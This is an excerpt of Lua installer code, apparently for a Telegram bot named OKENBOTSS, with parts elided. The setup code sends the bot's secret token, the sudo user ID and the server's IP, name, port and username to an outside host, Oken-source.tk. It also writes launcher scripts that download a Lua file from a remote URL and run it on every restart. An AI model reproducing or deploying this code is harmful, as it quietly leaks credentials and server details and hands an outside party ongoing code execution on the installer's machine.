...
data,res = https.request("https://Oken-source.tk/OkenTeAM/index.php?bn=info&id="..Id)
if res == 200 then
...
local t = json:decode(https.request('https://Oken-source.tk/OkenTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Oken::")
local RunBot = io.open("OKENBOTSS", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/OKENBOTSS
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr OKENBOTSS.lua
wget "https://raw.githubusercontent.com/alblymlk/OKENBOTSS/master/OKENBOTSS.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./OKENBOTSS.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S OKENBOTSS -X kill
screen -S OKENBOTSS ./OKENBOTSS
done
]])
RunTs:close()
end
